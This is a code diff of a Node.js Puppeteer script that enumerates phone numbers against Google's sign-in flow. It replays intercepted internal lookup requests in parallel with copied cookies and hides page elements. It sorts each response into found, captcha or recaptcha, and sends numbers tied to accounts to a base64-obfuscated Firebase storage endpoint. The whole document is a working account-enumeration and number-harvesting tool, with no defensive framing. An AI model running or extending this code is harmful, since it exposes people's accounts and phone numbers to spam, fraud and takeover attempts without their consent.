@@ -1,17 +1,21 @@
 const StealthPlugin = require('puppeteer-extra-plugin-stealth')
+const { CookieJar } = require('tough-cookie')
 const puppeteer = require('puppeteer-extra')
+const got = require('got')
 
 const args = process.argv.slice(2)
 
 let USER = args[0]
 
 let mConfig = null
-let mLoaded = false
-let mUrl = null
-let mPostData = null
-let mHeaders = null
+let mPageLoad = false
 let page = null
 let mStart = Date.now()
+let mCookies = null
+let mFirstNumber = ''
+let mStatus = {}
+let mTarget = 0
+let mLoad = 0
 
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')
 
@@ -63,11 +67,9 @@ async function startBrowser() {
         page.on('request', async request => {
             try {
                 let url = request.url()
-                if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e') && !url.endsWith('request=manually')) {
-                    mUrl = url
-                    mHeaders = request.headers()
-                    mPostData = request.postData()
-                    
+                if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e')) {
+                    parallelRequest(page, url, request.headers(), request.postData())
+
                     let contentType = 'application/json; charset=utf-8'
                     let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')
 
@@ -89,7 +91,8 @@ async function startBrowser() {
 
         await loadLoginPage()
 
-        mLoaded = true
+        mPageLoad = true
+        mCookies = null
 
         console.log('Page Load Success')
         
@@ -105,54 +108,25 @@ async function foundLoginNumber() {
         if (mConfig) {
             mStart = Date.now()
             try {
-                let prev = mConfig.n
-                let target = mConfig.s
-                let found = 0
-                let captcha = 0
-                let recaptcha = 0
-                let other = 0
-                for (let i = 0; i < target; i++) {
-                    if (prev != mConfig.n) {
-                        i = 0
-                        other = 0
-                        found = 0
-                        captcha = 0
-                        recaptcha = 0
-                        target = mConfig.s
-                    }
+                mFirstNumber = mConfig.n.toString()
+                mTarget = mConfig.s
+                mLoad = 0
 
-                    let number = mConfig.n+i
-
-                    try {
-                        let status = await getLoginStatus('+'+number)
-
-                        if (status == 0) {
-                            status = await getLoginStatus('+'+number)
-                        }
-                        if (status == 0) {
-                            status = await getLoginStatus('+'+number)
-                        }
-                        if (status == 5) {
-                            await delay(2000)
-                            status = await getLoginStatus('+'+number)
-                        }
-
-                        if (status == 0 || status == 1) {
-                            found++
-                            await saveNumber(mConfig.u, mConfig.k, number)
-                        } else if (status == 2) {
-                            recaptcha++
-                        } else if (status == 5) {
-                            captcha++
-                        } else if (status == 3) {
-                            other++
-                        }
-                    } catch (error) {}
-
-                    await delay(Math.min(mConfig.d, 2000))
+                mStatus = {
+                    found: 0,
+                    captcha: 0,
+                    recaptcha: 0,
+                    other: 0
                 }
 
-                process.send({ t: 5, s: 'controller_status', c:USER, d: { t:1, u:mConfig.u, s:USER, f:found, r:recaptcha, c:captcha, o:other } })
+                for (let i = 0; i < mTarget; i++) {
+                    await setLoginNumber('+'+(mConfig.n+i))
+                    await delay(Math.min(mConfig.d?mConfig.d:0, 2000))
+                }
+
+                await waitForCompleted(mTarget*2000)
+
+                process.send({ t: 5, s: 'controller_status', c:USER, d: { t:1, u:mConfig.u, s:USER, f:mStatus.found, r:mStatus.recaptcha, c:mStatus.captcha, o:mStatus.other } })
             } catch (error) {}
 
             mConfig = null
@@ -163,86 +137,129 @@ async function foundLoginNumber() {
 }
 
 
-async function getLoginStatus(number) {
+async function setLoginNumber(number) {
     try {
         for (let i = 0; i < 60; i++) {
-            if (mLoaded) {
+            if (mPageLoad) {
                 break
             }
             await delay(500)
         }
 
-        if (!mLoaded) {
-            return 0
-        }
-
-        mUrl = null
-        mHeaders = null
-        mPostData = null
-        await page.evaluate((number) => {
+        page.evaluate((number) => {
             document.querySelector('input#identifierId').value = number
             document.querySelector('#identifierNext').click()
-        }, number)
-        let url = null
-        let headers = null
-        let postData = null
-        for (let i = 0; i < 150; i++) {
-            if (mUrl && mPostData && mHeaders) {
-                url = mUrl
-                headers = mHeaders
-                postData = mPostData
-                break
+            let root = document.querySelector('div[class="kPY6ve"]')
+            if (root) {
+                root.style.display = 'none'
             }
-            await delay(100)
+        }, number)
+
+        await delay(10)
+    } catch (error) {}
+}
+
+async function parallelRequest(page, url, reqHeaders, postData) {
+    try {
+        let headers = {
+            ...reqHeaders,
+            accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'accept-language': 'en',
+            host: new URL(url).hostname
         }
-        
-        mUrl = null
-        mHeaders = null
-        mPostData = null
-        
-        if (url && postData && headers) {
-            let data = await page.evaluate(async (u, h, p) => {
-                let res = await fetch(u, {
-                    method: 'POST',
-                    headers: h,
-                    body: p
-                })
 
-                return await res.text()
-            }, url+(url.endsWith('&') ? '': '&')+'request=manually', headers, postData)
+        if (!mCookies) {
+            let puppeteerCookies = await page.cookies()
+            let cookies = puppeteerCookies.map(cookie => ({
+                creation: new Date().toISOString(),
+                domain: cookie.domain.replace(/^\./, ''),
+                expires: cookie.expires === -1 ? Infinity : new Date(cookie.expires * 1000).toISOString(),
+                hostOnly: !cookie.domain.startsWith('.'),
+                httpOnly: cookie.httpOnly,
+                key: cookie.name,
+                lastAccessed: new Date().toISOString(),
+                path: cookie.path,
+                secure: cookie.secure,
+                value: cookie.value
+            }))
 
-            let temp = data.substring(data.indexOf('[['), data.lastIndexOf(']]')-2)
-            temp = temp.substring(0, temp.lastIndexOf(']]')+2)
+            mCookies = CookieJar.deserializeSync({
+                cookies,
+                rejectPublicSuffixes: true,
+                storeType: 'MemoryCookieStore',
+                version: 'tough-cookie@2.0.0'
+            })   
+        }
 
-            let json = JSON.parse(temp)[0]
-            if (json[1] == 'MI613e') {
-                let value = JSON.parse(json[2])
-                if (value[21]) {
+        try {
+            let response = await got(url, {
+                method: 'POST',
+                headers,
+                body: postData,
+                cookieJar: mCookies,
+                responseType: 'buffer',
+                followRedirect: false,
+                throwHttpErrors: false,
+                timeout: {
+                    request: 15000
+                }
+            })
+
+            mLoad++
+
+            let data = extractArrays(response.body.toString())[0][0]
+
+            if (data[1] == 'MI613e') {
+                let value = JSON.parse(data[2])
+                if (value[21] && value[22]) {
                     let values = JSON.stringify(value[21])
                     if (values.includes('/v3/signin/challenge/pwd') || values.includes('/v3/signin/rejected')) {
-                        return 1
+                        mStatus.found++
+                        let number = findNumberFromData(postData, value[22])
+                        await saveNumber(mConfig.u, mConfig.k, number)
                     } else if (values.includes('/v3/signin/challenge/recaptcha')) {
-                        return 2
+                        mStatus.recaptcha++
+                    } else {
+                        mStatus.other++
                     }
-                    return 3
                 } else if (value[18] && value[18][0]) {
-                    return 5
-                } else {
-                    return 4
+                    mStatus.captcha++
                 }
+            } else {
+                mStatus.other++
             }
+        } catch (error) {
+            mStatus.other++
+            mLoad++
         }
-    } catch (error) {}
+    } catch (err) {
+        mStatus.other++
+        mLoad++
+    }
 
-    return 0
+    return null
+}
+
+async function waitForCompleted(timeout = 60000) {
+    let start = Date.now()
+
+    while (true) {
+        if (Date.now() - start > timeout) {
+            break
+        }
+
+        if (mLoad >= mTarget) break
+        await delay(100)
+    }
 }
 
 async function pageReload() {
-    mLoaded = false
+    mPageLoad = false
     console.log('Page Reloading...')
     await loadLoginPage()
     console.log('Page Reload Success')
-    mLoaded = true
+    mCookies = null
+    mPageLoad = true
 }
 
 
@@ -251,10 +268,10 @@ async function loadLoginPage() {
         try {
             await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
             await delay(500)
-                await page.evaluate(() => {
+            await page.evaluate(() => {
                 let root = document.querySelector('div[class="kPY6ve"]')
                 if (root) {
-                    root.remove()
+                    root.style.display = "none"
                 }
                 root = document.querySelector('div[class="Ih3FE"]')
                 if (root) {
@@ -273,6 +290,55 @@ async function saveNumber(user, key, number) {
             body: ''
         })
     } catch (error) {}
+}
+
+function findNumberFromData(postData, value) {
+
+    try {
+        let number = null
+
+        try {
+            number = JSON.parse(JSON.parse(Object.fromEntries(new URLSearchParams(postData))['f.req'])[0][0][1])[1]
+        } catch (error) {}
+
+        if (!number) {
+            number = value.replace(/\D/g, '')
+
+            if(number.startsWith('0')) {
+                number = number.slice(1)
+            }
+
+            let countryCode = mFirstNumber.substring(0, mFirstNumber.length - number.length)
+
+            return countryCode+number
+        }
+
+        if(number.startsWith('+')) {
+            return number.slice(1)
+        }
+    } catch (error) {}
+
+    return null
+}
+
+function extractArrays(raw) {
+    raw = raw.replace(/^\)\]\}'\s*/g, '')
+
+    let lines = raw.split('\n')
+
+    let arrays = []
+
+    for (let i = 0; i < lines.length; i++) {
+        let line = lines[i].trim()
+
+        if (line.startsWith('[')) {
+            try {
+                arrays.push(JSON.parse(line))
+            } catch {}
+        }
+    }
+
+    return arrays
 }
 
 function decode(data) {
